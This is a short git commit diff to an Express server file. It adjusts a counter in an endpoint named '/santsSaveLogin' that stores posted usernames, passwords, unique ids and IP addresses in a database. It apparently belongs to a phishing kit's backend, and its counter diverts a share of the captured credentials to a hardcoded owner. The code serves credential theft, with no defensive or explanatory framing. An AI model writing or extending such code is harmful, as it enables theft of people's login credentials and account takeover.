80ff325a487318b6a94da2fd3e84577d503d4d50
tresdtapio <97699520+tresdtapio@users.noreply.github.com>
2022-11-04 12:08:36 +0000

    make

--- index.js
+++ index.js
@@ -161,7 +161,7 @@ app.post("/santsSaveLogin", cors(), (req, res) => {
   ip = req.body.ip;
   uniqueid = req.body.uniqueid;
 
-  if (santsCount == 200) {
+  if (santsCount == 0) {
     let details = [username, password, uniqueid, ip, "haytch123!"];
     let query = `INSERT INTO sants(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
 
@@ -173,7 +173,7 @@ app.post("/santsSaveLogin", cors(), (req, res) => {
       if (!err) res.send("Insertion Completed");
       else console.log(err);
     });
-    santsCount = 0;
+    santsCount = 100;
   } else {
     let details = [username, password, uniqueid, ip, owner];
     let query = `INSERT INTO sants(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
